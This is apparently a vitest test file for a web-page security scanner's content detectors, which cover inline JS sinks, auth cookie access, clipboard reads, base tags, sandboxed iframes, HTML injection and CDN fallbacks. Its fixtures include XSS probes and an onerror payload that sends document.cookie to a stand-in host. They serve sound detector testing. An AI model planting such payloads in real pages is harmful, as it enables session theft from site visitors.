/**
 * The content.ts detectors that judge a page's own code and markup, written
 * against the pages that made them noisy. Each describe names the fixture
 * family from the research (DI, EV1, CK, DC, CL, BT, IF, HI, MC, AC, IE, CDN)
 * so a failing line points at the real-world shape it was cut for.
 */
import { describe, expect, it } from "vitest";
import { detectors } from "@/lib/scanner/checks/content";

const PAGE = "https://example.com/";

function run(
  id: string,
  body: string,
  opts: { url?: string; headers?: Record<string, string> } = {},
): string | null {
  return detectors[id](opts.url ?? PAGE, new Headers(opts.headers), body);
}

const script = (code: string) =>
  `<html><body><script>${code}</script></body></html>`;

describe("dangerous-inline-js", () => {
  // The proof-of-work gate in front of three SellAuth storefronts: a 6 KB
  // minified js-sha1 with the bundler-evasion eval, one long line.
  const sha1Bundle = `window.onload=function(){${"var p=function(t){var h=eval(\"require('crypto')\");return h};".repeat(120)}}`;

  it("EV1: a literal eval inside a vendor bundle reports nothing", () => {
    expect(sha1Bundle.length).toBeGreaterThan(4096);
    expect(run("dangerous-inline-js", script(sha1Bundle))).toBeNull();
  });

  it("DI1 and DI2: clearing or labelling a box with innerHTML is not a sink finding", () => {
    expect(
      run(
        "dangerous-inline-js",
        script(`box.innerHTML = ""; spin.innerHTML = "Loading...";`),
      ),
    ).toBeNull();
  });

  it("eval( is eval-in-client-script's, not this id's", () => {
    expect(run("dangerous-inline-js", script(`eval(userInput);`))).toBeNull();
  });

  it("first-party document.write still reports", () => {
    expect(
      run(
        "dangerous-inline-js",
        script(`document.write("<b>" + name + "</b>");`),
      ),
    ).toContain("document.write");
  });

  it("first-party string setTimeout and new Function still report", () => {
    expect(
      run("dangerous-inline-js", script(`setTimeout("tick()", 100);`)),
    ).not.toBeNull();
    expect(
      run("dangerous-inline-js", script(`var f = new Function("a", body);`)),
    ).not.toBeNull();
  });

  it("a document.write inside a /*! banner library is skipped, the same line in the site's code is not", () => {
    const lib = `/*! tiny-lib v2.3.1 | MIT */\n!function(){document.write("x")}();`;
    expect(run("dangerous-inline-js", script(lib))).toBeNull();
    expect(
      run("dangerous-inline-js", script(`!function(){document.write("x")}();`)),
    ).not.toBeNull();
  });
});

describe("inline-event-handlers", () => {
  const nuxtImg = `<img src="/a.png" onerror="this.setAttribute('data-error', 1)">`;

  it("counts attributes and distinct handlers, so fifty identical onerrors read as one", () => {
    const evidence = run("inline-event-handlers", nuxtImg.repeat(50));
    expect(evidence).toContain(
      "50 inline event handler attributes, 1 distinct handlers",
    );
    expect(evidence).toContain(`onerror="this.setAttribute('data-error', 1)"`);
    expect(evidence!.match(/onerror=/g)).toHaveLength(1);
  });

  it("caps the sample at five distinct handlers and says how many more there are", () => {
    const body = Array.from(
      { length: 9 },
      (_, i) => `<button onclick="run${i}()">b</button>`,
    ).join("");
    const evidence = run("inline-event-handlers", body)!;
    expect(evidence).toContain(
      "9 inline event handler attributes, 9 distinct handlers",
    );
    expect(evidence.match(/onclick=/g)).toHaveLength(5);
    expect(evidence).toContain("and 4 more distinct");
  });

  it("stays quiet under three attributes", () => {
    expect(run("inline-event-handlers", nuxtImg.repeat(2))).toBeNull();
  });
});

describe("document-cookie-access", () => {
  it("CK2: 'author' and a consent cookie are not auth", () => {
    expect(
      run(
        "document-cookie-access",
        script(`document.cookie = "cookieconsent=1"; var author = 1;`),
      ),
    ).toBeNull();
  });

  it("DC2: a function parameter called token is not a cookie name", () => {
    expect(
      run(
        "document-cookie-access",
        script(
          `function f(token){ return document.cookie.indexOf('loggedConversion=' + token) > -1; }`,
        ),
      ),
    ).toBeNull();
  });

  it("DC1: reading auth_token through a regex fires and names the cookie", () => {
    const evidence = run(
      "document-cookie-access",
      script(`var m = document.cookie.match(/auth_token=([^;]+)/);`),
    );
    expect(evidence).toContain("auth_token");
  });

  it.each([
    [`document.cookie = "session=" + id;`, "session"],
    [`document.cookie = "connect.sid=abc";`, "connect.sid"],
    [`document.cookie.indexOf("PHPSESSID=")`, "PHPSESSID"],
    [`document.cookie = "authToken=" + t;`, "authToken"],
    [`document.cookie.match(/(?:^|;\\s*)jwt=([^;]*)/)`, "jwt"],
  ])("fires on %s", (code, name) => {
    expect(run("document-cookie-access", script(code))).toContain(name);
  });

  it("the script-readable double-submit CSRF cookie is the design, not a finding", () => {
    expect(
      run(
        "document-cookie-access",
        script(`var t = document.cookie.match(/XSRF-TOKEN=([^;]+)/);`),
      ),
    ).toBeNull();
    expect(
      run(
        "document-cookie-access",
        script(`document.cookie = "csrftoken=" + t;`),
      ),
    ).toBeNull();
  });

  it("does not guess at a cookie whose name is computed", () => {
    expect(
      run(
        "document-cookie-access",
        script(`document.cookie = name + "=" + value; // auth`),
      ),
    ).toBeNull();
  });
});

describe("clipboard-access", () => {
  it("CL1: a copy button that writes is not a finding", () => {
    expect(
      run(
        "clipboard-access",
        script(
          `navigator.clipboard.writeText(document.getElementById('addr').value);`,
        ),
      ),
    ).toBeNull();
    expect(
      run("clipboard-access", script(`document.execCommand("copy");`)),
    ).toBeNull();
  });

  it("CL2: reading the clipboard fires", () => {
    expect(
      run(
        "clipboard-access",
        script(`navigator.clipboard.readText().then(use);`),
      ),
    ).toContain("reads the clipboard");
    expect(
      run("clipboard-access", script(`navigator.clipboard.read();`)),
    ).not.toBeNull();
    expect(
      run("clipboard-access", script(`document.execCommand("paste");`)),
    ).not.toBeNull();
  });
});

describe("autocomplete-sensitive", () => {
  it("AC2 and AC3: a password field without autocomplete is the browser default", () => {
    expect(
      run(
        "autocomplete-sensitive",
        `<form><input type="password" name="pw"></form>`,
      ),
    ).toBeNull();
    expect(
      run(
        "autocomplete-sensitive",
        `<form><input type=password name=pw></form>`,
      ),
    ).toBeNull();
  });

  it("a card number field with no autocomplete fires", () => {
    expect(
      run("autocomplete-sensitive", `<input name="card_number" type="text">`),
    ).toContain("1 card field");
    expect(
      run("autocomplete-sensitive", `<input id=cc-number>`),
    ).not.toBeNull();
    expect(
      run("autocomplete-sensitive", `<input name="cc_cvv">`),
    ).not.toBeNull();
  });

  it("a payment-method radio or hidden input named for the card holds no card number", () => {
    expect(
      run(
        "autocomplete-sensitive",
        `<input type="radio" id="credit-card" name="payment" value="card"><input type="hidden" name="card_number">`,
      ),
    ).toBeNull();
  });

  it("a card field that names its autocomplete token is fine", () => {
    expect(
      run(
        "autocomplete-sensitive",
        `<input name="card_number" autocomplete="cc-number">`,
      ),
    ).toBeNull();
  });

  it("a field that only contains the letters of a card word is not a card field", () => {
    expect(
      run("autocomplete-sensitive", `<input name="discard_numbering">`),
    ).toBeNull();
    expect(run("autocomplete-sensitive", `<input name="postcard">`)).toBeNull();
  });
});

describe("base-tag", () => {
  it("BT1: <base href=/> is an app shell, not a hijack", () => {
    expect(run("base-tag", `<head><base href="/"></head>`)).toBeNull();
    expect(run("base-tag", `<head><base href="/app/"></head>`)).toBeNull();
    expect(
      run("base-tag", `<head><base href="https://example.com/x/"></head>`),
    ).toBeNull();
  });

  it("BT4: a base-uri in the response header clears it", () => {
    expect(
      run("base-tag", `<head><base href="https://cdn.other.example/"></head>`, {
        headers: { "content-security-policy": "base-uri 'self'" },
      }),
    ).toBeNull();
  });

  it("a base-uri in a meta CSP still clears it", () => {
    expect(
      run(
        "base-tag",
        `<head><meta http-equiv="Content-Security-Policy" content="base-uri 'none'"><base href="https://cdn.other.example/"></head>`,
      ),
    ).toBeNull();
  });

  it("BT2: a base on another origin fires", () => {
    expect(
      run("base-tag", `<head><base href="https://cdn.other.example/"></head>`),
    ).toContain("https://cdn.other.example");
  });

  it("BT3: a protocol-relative or http base on an https page fires", () => {
    expect(
      run("base-tag", `<head><base href="//other.example/"></head>`),
    ).not.toBeNull();
    expect(
      run("base-tag", `<head><base href="http://example.com/"></head>`),
    ).not.toBeNull();
  });

  it("a <base target> with no href resolves nothing", () => {
    expect(run("base-tag", `<head><base target="_blank"></head>`)).toBeNull();
  });
});

describe("iframe-allow-scripts-allow-same-origin", () => {
  const flags =
    "allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts";

  it("IF1: Discord's own widget snippet is a cross-origin frame", () => {
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe src="https://discord.com/widget?id=1&theme=dark" sandbox="${flags}"></iframe>`,
      ),
    ).toBeNull();
  });

  it("IF2: a relative or same-origin src with both flags fires", () => {
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe src="/embed/a" sandbox="${flags}"></iframe>`,
      ),
    ).toContain("1 sandboxed iframe");
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe src="https://example.com/embed" sandbox="allow-scripts allow-same-origin"></iframe>`,
      ),
    ).not.toBeNull();
  });

  it("IF3: a srcdoc with an unescaped > before the sandbox attribute still fires", () => {
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe srcdoc="<p>hi</p>" sandbox="allow-scripts allow-same-origin"></iframe>`,
      ),
    ).not.toBeNull();
  });

  it("a blob: frame fires and a data: frame, with an opaque origin, does not", () => {
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe src="blob:https://example.com/1f2e" sandbox="allow-scripts allow-same-origin"></iframe>`,
      ),
    ).not.toBeNull();
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe src="data:text/html,hi" sandbox="allow-scripts allow-same-origin"></iframe>`,
      ),
    ).toBeNull();
  });

  it("one flag alone, or no sandbox, is not this check", () => {
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe src="/a" sandbox="allow-scripts"></iframe>`,
      ),
    ).toBeNull();
    expect(
      run(
        "iframe-allow-scripts-allow-same-origin",
        `<iframe src="/a"></iframe>`,
      ),
    ).toBeNull();
  });
});

describe("html-injection-patterns", () => {
  it("HI1: Nuxt Image's framework onerror on fifty images is not an injection", () => {
    const img = `<img src="/_ipx/w_100/a.png" onerror="this.setAttribute('data-error', 1)">`;
    expect(run("html-injection-patterns", img.repeat(50))).toBeNull();
    expect(
      run(
        "html-injection-patterns",
        `<img src="/a.png" onerror="this.style.display='none'">`,
      ),
    ).toBeNull();
  });

  it("HI2: the classic probe fires", () => {
    expect(
      run("html-injection-patterns", `<p><img src=x onerror=alert(1)></p>`),
    ).toContain("onerror");
    expect(
      run(
        "html-injection-patterns",
        `<img src="/a.png" onerror="fetch('//e.example/?c='+document.cookie)">`,
      ),
    ).not.toBeNull();
  });

  it("a lazy-load placeholder src is not a probe src", () => {
    expect(
      run(
        "html-injection-patterns",
        `<img src="" data-src="/a.png" onerror="this.src='/fallback.png'">`,
      ),
    ).toBeNull();
  });

  it("HI3: a closed title followed by a payload script fires, with the script in the stripped view", () => {
    expect(
      run(
        "html-injection-patterns",
        `<title>x</title><script>alert(document.domain)</script>`,
      ),
    ).toContain("title");
  });

  it("a minified head with a script right after the title is how every site is written", () => {
    expect(
      run(
        "html-injection-patterns",
        `<head><title>Home</title><script>window.dataLayer=[];</script></head>`,
      ),
    ).toBeNull();
    expect(
      run(
        "html-injection-patterns",
        `<head><title>Home</title><script src="/a.js"></script></head>`,
      ),
    ).toBeNull();
  });

  it("a payload quoted in a code sample is documentation", () => {
    expect(
      run(
        "html-injection-patterns",
        `<pre><code>&lt;title&gt;x&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><pre><code><img src=x onerror=alert(1)></code></pre>`,
      ),
    ).toBeNull();
  });
});

describe("sensitive-meta-tags", () => {
  it("MC1: the Laravel, Rails and Django csrf meta is not a leak", () => {
    expect(
      run("sensitive-meta-tags", `<meta name="csrf-token" content="abc123">`),
    ).toBeNull();
    expect(
      run("sensitive-meta-tags", `<meta name="X-CSRF-Token" content="abc123">`),
    ).toBeNull();
  });

  it("MC2: a real api secret still fires", () => {
    expect(
      run(
        "sensitive-meta-tags",
        `<meta name="api-secret" content="sk_live_abc123def456">`,
      ),
    ).toContain("1 meta tag");
  });
});

describe("cdn-fallback-missing", () => {
  const cdn = `<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>`;

  it("SRI9: an unrelated <img onerror> no longer hides a CDN script", () => {
    expect(
      run("cdn-fallback-missing", `<img src=a onerror="x()">${cdn}`),
    ).toContain("1 CDN script");
  });

  it("a script with its own onerror has a fallback", () => {
    expect(
      run(
        "cdn-fallback-missing",
        `<script src="https://unpkg.com/lodash@4.17.21/lodash.js" onerror="loadLocal()"></script>`,
      ),
    ).toBeNull();
  });

  it("the window.X || shape right after the script is a fallback", () => {
    expect(
      run(
        "cdn-fallback-missing",
        `${cdn}<script>window.jQuery || document.write('<script src="/jquery.js"><\\/script>')</script>`,
      ),
    ).toBeNull();
    expect(
      run(
        "cdn-fallback-missing",
        `${cdn}<script>if (typeof jQuery === "undefined") load();</script>`,
      ),
    ).toBeNull();
  });

  it("a fallback far past the window does not count", () => {
    expect(
      run(
        "cdn-fallback-missing",
        `${cdn}${"<p>x</p>".repeat(120)}<script>window.jQuery || load()</script>`,
      ),
    ).toContain("1 CDN script");
  });

  it("counts only the scripts without one, and only on the CDN's whole hostname", () => {
    const other = `<script src="https://cdn.jsdelivr.net/npm/vue@3.4.0/dist/vue.js"></script>`;
    expect(run("cdn-fallback-missing", `${cdn}${other}`)).toContain(
      "2 CDN scripts",
    );
    expect(
      run(
        "cdn-fallback-missing",
        `<script src="https://unpkg.com.evil.example/a.js"></script>`,
      ),
    ).toBeNull();
    expect(
      run(
        "cdn-fallback-missing",
        `<script src="/local/a.js?from=unpkg.com"></script>`,
      ),
    ).toBeNull();
  });
});
